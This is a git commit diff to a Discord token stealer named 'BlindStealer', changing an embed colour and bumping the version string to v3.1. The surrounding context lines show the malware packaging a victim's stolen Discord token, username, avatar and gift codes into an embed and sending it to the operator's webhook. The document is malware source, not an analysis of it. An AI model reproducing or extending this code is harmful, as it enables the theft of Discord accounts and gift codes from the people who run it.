92393e915cff4352de66a8f8d3f5bd46051ccf36
READDONE313 <98390001+READDONE313@users.noreply.github.com>
2023-05-07 20:13:26 +0000

    Update discordtoken.py

--- src/components/discordtoken.py
+++ src/components/discordtoken.py
@@ -339,7 +339,7 @@ class upload_tokens:
             else:
                 codes = None
 
-            embed = Embed(title=f"{username}", color=0x000000)
+            embed = Embed(title=f"{username}", color=0x24262A)
             embed.set_thumbnail(url=avatar)
 
             embed.add_field(name="🔓 Token", value=f"```{token}```", inline=False)
@@ -359,4 +359,4 @@ class upload_tokens:
                 embed.add_field(name="🎁 Gift Codes", value=codes, inline=False)
             embed.set_footer(text="Created by: readdone#9772")
 
-            self.webhook.send(embed=embed, username="BlindStealer - v3", avatar_url="https://i.imgur.com/LNVOaxg.png")
+            self.webhook.send(embed=embed, username="BlindStealer - v3.1", avatar_url="https://i.imgur.com/LNVOaxg.png")
